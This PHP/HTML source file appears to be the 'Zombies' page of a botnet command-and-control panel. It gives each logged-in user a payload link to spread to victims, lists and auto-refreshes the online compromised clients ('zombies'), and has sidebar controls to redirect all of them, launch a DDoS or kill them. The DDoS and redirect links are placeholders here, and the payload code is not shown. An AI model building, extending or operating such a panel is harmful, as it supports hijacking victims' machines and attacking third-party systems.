<?php
/*
Page: Zombies
*/
require_once('./includes/functions.php');
?>

<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="icon" href="../../favicon.ico">

    <title><?php echo "$sitename"; ?></title>

    <!-- Bootstrap core CSS -->
    <link href="./styles/bootstrap-3.3.7/css/bootstrap-slate.min.css" rel="stylesheet">
    <link href="./styles/stylesheet.css" rel="stylesheet">

    <!-- Custom styles for this template -->
    <link href="./styles/bootstrap-3.3.7/css/dashboard.css" rel="stylesheet">
  </head>

<?php
//Secondary side bar links array
//First value is name of options
//Second link is onclick function for options
$sidebarlinks = array(
	"divider" => "Control All Zombies",
	"Redirect All" => "#",
	"DDOS" => "#",
	"Kill All" => ""
);

//Display main boostrap HTML
//First value is name of page
//Second value is array of secondary side bar links
display_bootstrap("Zombies", $sidebarlinks);

//Main body of page
echo '<div class="col-sm-9 col-sm-offset-3 col-md-10 col-md-offset-2 main">
          <h1 class="page-header">'.$sitename.'</h1>';
if(user_logged_in()) {
	$domain = $_SERVER['HTTP_HOST'];
	$uid = get_unique_id(get_userid());
	echo "Your payload link: <a href='http://$domain$sitepath/payload.php?uid=$uid'>http://$domain$sitepath/payload.php?uid=$uid</a><br><br><br><div class='row placeholders'>";
	get_online_zombies($uid);
} else {
	echo "Logged out";
}
echo '</div>
</div>';
?>
<script>
function refresh_zombies() {
	$('#online_zombies').load('zombies.php #online_zombies');
	$('#zombie_stats').load('zombies.php #zombie_stats');
}
setInterval(refresh_zombies, <?php echo "$zombielistrefresh"; ?>);
</script>
  <!-- Modal -->
  <div class="modal fade" id="modal" role="dialog">
    <div class="modal-dialog">
    
      <!-- Modal content-->
      <div class="modal-content">
        <div class="modal-header">
          <button type="button" class="close" data-dismiss="modal">&times;</button>
          <h4 class="modal-title">Modal Header</h4>
        </div>
        <div class="modal-body">
          <p>Some text in the modal.</p>
        </div>
        <div class="modal-footer">
          <button type="button" class="btn btn-default" data-dismiss="modal" onclick="" id="modalButton">Close</button>
        </div>
      </div>
      
    </div>
  </div>